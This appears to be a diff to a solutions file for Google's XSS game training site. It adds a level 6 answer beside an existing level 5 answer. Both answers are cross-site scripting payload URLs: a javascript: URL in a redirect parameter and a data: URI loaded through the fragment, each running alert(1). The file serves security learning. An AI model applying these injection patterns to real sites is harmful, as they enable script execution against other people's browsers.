@@ -20,3 +20,7 @@ LEVEL 4
 LEVEL 5
 -------
 ```https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)```
+
+LEVEL 6
+-------
+```https://xss-game.appspot.com/level6/frame#data:text/plain,alert(1)```
